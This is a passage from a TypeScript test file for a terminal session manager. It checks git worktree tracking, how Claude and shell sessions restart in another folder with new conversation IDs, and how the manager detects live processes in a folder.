    listings.set(other, listing(other, [work, other]));
    const a = shell(work);
    const b = shell(other);
    await vi.waitFor(() => {
      expect(mgr.get(a.id)!.git?.worktreeCount).toBe(1);
      expect(mgr.get(b.id)!.git?.worktreeCount).toBe(2);
    });
    const grown = [work, other, join(home.dir(), 'third')];
    listings.set(work, listing(work, grown));
    listings.set(other, listing(other, grown));
    await mgr.refreshGitIn(work);
    expect(mgr.get(a.id)!.git?.worktreeCount).toBe(3);
    expect(mgr.get(b.id)!.git?.worktreeCount).toBe(3);
  });

  it('refreshGit leaves the git of an exited session frozen', async () => {
    listings.set(work, listing(work, [work]));
    const s = shell();
    await vi.waitFor(() => expect(mgr.get(s.id)!.git?.worktree).toBe(work));
    ptys.last().exit(0);
    listings.set(work, listing(work, [work, other]));
    gitCalls.length = 0;
    let changes = 0;
    mgr.onChange(() => changes++);
    await mgr.refreshGit(s.id);
    expect(mgr.get(s.id)!.git?.worktreeCount).toBe(1);
    expect(gitCalls).toEqual([]);
    expect(changes).toBe(0);
  });

  it('setLiveCwd is ignored for an exited session', async () => {
    const s = claude();
    await vi.waitFor(() => expect(gitCalls).toEqual([work]));
    ptys.last().exit(0);
    gitCalls.length = 0;
    let changes = 0;
    mgr.onChange(() => changes++);
    mgr.setLiveCwd(s.id, other);
    expect(mgr.get(s.id)!.liveCwd).toBeNull();
    expect(changes).toBe(0);
    expect(gitCalls).toEqual([]);
  });
});

describe('mapIntoWorktree', () => {
  it('keeps the sub-folder when it exists in the target', () => {
    expect(mapIntoWorktree('/r/a/src/web', '/r/a', '/r/b', (p) => p === '/r/b/src/web')).toBe('/r/b/src/web');
  });

  it('falls back to the target root when the sub-folder is missing', () => {
    expect(mapIntoWorktree('/r/a/src/web', '/r/a', '/r/b', () => false)).toBe('/r/b');
  });

  it('falls back to the target root when the folder is outside the worktree', () => {
    expect(mapIntoWorktree('/x/y', '/r/a', '/r/b', () => true)).toBe('/r/b');
    expect(mapIntoWorktree('/r/ab/src', '/r/a', '/r/b', () => true)).toBe('/r/b');
  });

  it('gives the target root for the worktree root itself', () => {
    expect(mapIntoWorktree('/r/a', '/r/a', '/r/b', () => true)).toBe('/r/b');
  });
});

describe('SessionManager restartIn', () => {
  const home = useTempHome();
  let ptys: ReturnType<typeof fakePtyFactory>;
  let mgr: SessionManager;
  let work: string;
  let other: string;
  let listings: Map<string, WorktreeListing | null>;
  const UUID = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;

  const listing = (current: string, paths: string[]): WorktreeListing => ({
    current,
    worktrees: paths.map((p, i) => ({ path: p, branch: i === 0 ? 'main' : 'feature', head: 'abc1234', isMain: i === 0, locked: false, prunable: false, bare: false })),
  });

  beforeEach(() => {
    ptys = fakePtyFactory();
    work = join(home.dir(), 'work');
    other = join(home.dir(), 'other');
    mkdirSync(work);
    mkdirSync(other);
    listings = new Map();
    const stories: Story[] = [{ id: 'st1', name: 'Story', ticket: '', cwd: work, color: '#445566', sound: '' }];
    mgr = new SessionManager({
      ptyFactory: ptys.factory,
      now: new FakeClock().now,
      config: () => defaultConfig(),
      port: 7717,
      hookToken: 't',
      hookScriptPath: '/h.js',
      statusScriptPath: '/s.js',
      builtins: () => [],
      stories: () => stories,
      gitOf: async (folder) => listings.get(folder) ?? null,
      headOf: () => null,
    });
  });

  const argAfter = (args: string[] | string, flag: string): string | undefined => {
    if (typeof args === 'string') throw new Error('expected a list of arguments');
    const i = args.indexOf(flag);
    return i < 0 ? undefined : args[i + 1];
  };

  it('returns null for an unknown session', () => {
    expect(mgr.restartIn('nope', other)).toBeNull();
  });

  it('restartIn keeps id, name, colour, area, model, background and font and starts in the new folder', () => {
    const s = mgr.create({
      kind: 'claude',
      command: node,
      args: ['--verbose'],
      cwd: work,
      name: 'Mine',
      color: '#123456',
      storyId: 'st1',
      model: 'opus',
      background: { color: '#202020', image: null, veil: 0 },
      font: { family: 'Consolas', size: 14 },
    });
    const old = ptys.last();
    const r = mgr.restartIn(s.id, other)!;
    expect(old.killed).toBe(true);
    expect(ptys.ptys).toHaveLength(2);
    expect(ptys.last().opts.cwd).toBe(other);
    expect(ptys.last().launch.args).toContain('--verbose');
    expect(r).toMatchObject({ id: s.id, name: 'Mine', color: '#123456', storyId: 'st1', model: 'opus', background: s.background, font: s.font, cwd: other, status: 'idle', exitCode: null, error: null });
    expect(mgr.get(s.id)).toEqual(r);
    expect(mgr.list()).toHaveLength(1);
    expect(argAfter(ptys.last().launch.args, '--model')).toBe('opus');
    expect(ptys.last().opts.env.SHELLYARD_SESSION_ID).toBe(s.id);
  });

  it('restartIn gives a Claude session a new conversation', () => {
    const s = mgr.create({ kind: 'claude', command: node, cwd: work });
    const before = mgr.conversationOf(s.id);
    mgr.restartIn(s.id, other);
    const after = mgr.conversationOf(s.id)!;
    expect(after).not.toBe(before);
    expect(after).toMatch(UUID);
    const args = ptys.last().launch.args;
    expect(argAfter(args, '--session-id')).toBe(after);
    expect(args).not.toContain('--resume');
    expect(mgr.restorable()[0]!.conversationId).toBe(after);
  });

  it('restartIn retires the conversation it replaces', () => {
    const s = mgr.create({ kind: 'claude', command: node, cwd: work });
    const before = mgr.conversationOf(s.id)!;
    expect(mgr.isRetiredConversation(s.id, before)).toBe(false);
    mgr.restartIn(s.id, other);
    const after = mgr.conversationOf(s.id)!;
    expect(mgr.isRetiredConversation(s.id, before)).toBe(true);
    expect(mgr.isRetiredConversation(s.id, after)).toBe(false);
    mgr.restartIn(s.id, work);
    expect(mgr.isRetiredConversation(s.id, before)).toBe(true);
    expect(mgr.isRetiredConversation(s.id, after)).toBe(true);
    expect(mgr.isRetiredConversation(s.id, 42)).toBe(false);
    expect(mgr.isRetiredConversation(s.id, undefined)).toBe(false);
    expect(mgr.isRetiredConversation('nope', before)).toBe(false);
  });

  it('restartIn adds nothing to the closed list', () => {
    const closed: string[] = [];
    mgr.onClosed((_e, id) => closed.push(id));
    const s = mgr.create({ kind: 'claude', command: node, cwd: work });
    mgr.restartIn(s.id, other);
    expect(closed).toEqual([]);
  });

  it('ignores the exit of the replaced process', () => {
    const closed: string[] = [];
    mgr.onClosed((_e, id) => closed.push(id));
    const outputs: string[] = [];
    mgr.onOutput((_id, d) => outputs.push(d));
    const s = mgr.create({ kind: 'claude', command: node, cwd: work });
    const old = ptys.last();
    // A real process ends some time after it is killed, not during the kill.
    old.kill = () => {
      old.killed = true;
    };
    mgr.restartIn(s.id, other);
    const settings = argAfter(ptys.last().launch.args, '--settings')!;
    expect(existsSync(settings)).toBe(true);
    old.emit('stale output');
    old.exit(1);
    expect(mgr.get(s.id)!.status).not.toBe('exited');
    expect(mgr.get(s.id)!.exitCode).toBeNull();
    expect(existsSync(settings)).toBe(true);
    expect(closed).toEqual([]);
    expect(outputs).toEqual([]);
    ptys.last().emit('fresh');
    expect(outputs).toEqual(['fresh']);
  });

  it('restartIn revives an exited session', async () => {
    listings.set(other, listing(other, [work, other]));
    const s = mgr.create({ kind: 'shell', command: node, cwd: work });
    ptys.last().exit(3);
    expect(mgr.get(s.id)).toMatchObject({ status: 'exited', exitCode: 3 });
    const r = mgr.restartIn(s.id, other)!;
    expect(r).toMatchObject({ status: 'running', exitCode: null, error: null, cwd: other });
    expect(mgr.restorable()).toHaveLength(1);
    await vi.waitFor(() => expect(mgr.get(s.id)!.git?.worktree).toBe(other));
  });

  it('restartIn starts a session that never started', () => {
    const s = mgr.create({ kind: 'shell', command: node, cwd: join(work, 'missing') });
    expect(s.status).toBe('exited');
    const r = mgr.restartIn(s.id, other)!;
    expect(r).toMatchObject({ status: 'running', error: null, cwd: other });
    expect(ptys.last().opts.cwd).toBe(other);
  });

  it('restartIn keeps the sub-folder when the target has it', async () => {
    mkdirSync(join(work, 'src'));
    mkdirSync(join(other, 'src'));
    listings.set(join(work, 'src'), listing(work, [work, other]));
    const s = mgr.create({ kind: 'shell', command: node, cwd: join(work, 'src') });
    await vi.waitFor(() => expect(mgr.get(s.id)!.git?.worktree).toBe(work));
    mgr.restartIn(s.id, other);
    expect(ptys.last().opts.cwd).toBe(join(other, 'src'));
  });

  it('restartIn uses the live folder of a Claude session for the sub-folder rule', async () => {
    mkdirSync(join(work, 'web'));
    mkdirSync(join(other, 'web'));
    listings.set(work, listing(work, [work, other]));
    listings.set(join(work, 'web'), listing(work, [work, other]));
    const s = mgr.create({ kind: 'claude', command: node, cwd: work });
    await vi.waitFor(() => expect(mgr.get(s.id)!.git?.worktree).toBe(work));
    mgr.setLiveCwd(s.id, join(work, 'web'));
    const r = mgr.restartIn(s.id, other)!;
    expect(ptys.last().opts.cwd).toBe(join(other, 'web'));
    expect(r.cwd).toBe(join(other, 'web'));
    expect(r.liveCwd).toBeNull();
  });

  it('forgets the git of a session whose restart fails', async () => {
    listings.set(work, listing(work, [work, other]));
    const s = mgr.create({ kind: 'shell', command: node, cwd: work });
    await vi.waitFor(() => expect(mgr.get(s.id)!.git?.worktree).toBe(work));
    const r = mgr.restartIn(s.id, join(home.dir(), 'missing'))!;
    expect(r.status).toBe('exited');
    expect(r.error).toMatch(/Folder does not exist/);
    expect(r.git).toBeNull();
    expect(mgr.get(s.id)!.git).toBeNull();
  });

  it('stops ignoring a retired conversation once the new process has reported', () => {
    const s = mgr.create({ kind: 'claude', command: node, cwd: work });
    const before = mgr.conversationOf(s.id)!;
    mgr.restartIn(s.id, other);
    const after = mgr.conversationOf(s.id)!;
    expect(mgr.isRetiredConversation(s.id, before)).toBe(true);
    // The new process reports: the old one is gone, and the user may /resume its conversation.
    mgr.setConversation(s.id, after);
    expect(mgr.isRetiredConversation(s.id, before)).toBe(false);
    mgr.setConversation(s.id, before);
    expect(mgr.conversationOf(s.id)).toBe(before);
  });
});

describe('SessionManager hasLiveProcessIn', () => {
  const home = useTempHome();
  let ptys: ReturnType<typeof fakePtyFactory>;
  let mgr: SessionManager;
  let clock: FakeClock;
  let wt: string;

  beforeEach(() => {
    ptys = fakePtyFactory();
    clock = new FakeClock();
    wt = join(home.dir(), 'app-feat');
    mkdirSync(join(wt, 'src'), { recursive: true });
    mkdirSync(join(home.dir(), 'app-feature'));
    mgr = new SessionManager({
      ptyFactory: ptys.factory,
      now: clock.now,
      config: () => defaultConfig(),
      port: 7717,
      hookToken: 't',
      hookScriptPath: '/h.js',
      statusScriptPath: '/s.js',
      builtins: () => [],
      gitOf: async () => null,
      headOf: () => null,
    });
  });

  /** A process that, like a real one, ends some time after it is killed. */
  const slowToDie = (): ReturnType<typeof ptys.last> => {
    const p = ptys.last();
    p.kill = () => {
      p.killed = true;
    };
    return p;
  };

  it('sees a running session in the folder or below it, not in a sibling', () => {
    mgr.create({ kind: 'shell', command: node, cwd: join(wt, 'src') });
    expect(mgr.hasLiveProcessIn(wt)).toBe(true);
    expect(mgr.hasLiveProcessIn(join(home.dir(), 'app-fe'))).toBe(false);
    expect(mgr.hasLiveProcessIn(join(home.dir(), 'app-feature'))).toBe(false);
  });

  it('does not count an exited session', () => {
    mgr.create({ kind: 'shell', command: node, cwd: wt });
    ptys.last().exit(0);
    expect(mgr.hasLiveProcessIn(wt)).toBe(false);
  });

  it('counts a closed session until its process has ended', () => {
    const s = mgr.create({ kind: 'shell', command: node, cwd: wt });
    const p = slowToDie();
    mgr.remove(s.id);
    expect(p.killed).toBe(true);
    expect(mgr.hasLiveProcessIn(wt)).toBe(true);
    p.exit(1);
    expect(mgr.hasLiveProcessIn(wt)).toBe(false);
  });

  it('counts the process a restart replaced until it has ended', () => {
    const s = mgr.create({ kind: 'shell', command: node, cwd: wt });
    const p = slowToDie();
    mgr.restartIn(s.id, join(home.dir(), 'app-feature'));
    expect(mgr.hasLiveProcessIn(wt)).toBe(true);
    p.exit(1);
    expect(mgr.hasLiveProcessIn(wt)).toBe(false);
  });

  it('stops waiting for a process that never reports its end', () => {
    const s = mgr.create({ kind: 'shell', command: node, cwd: wt });
    slowToDie();
    mgr.remove(s.id);
    clock.advance(11000);
    expect(mgr.hasLiveProcessIn(wt)).toBe(false);
  });

});
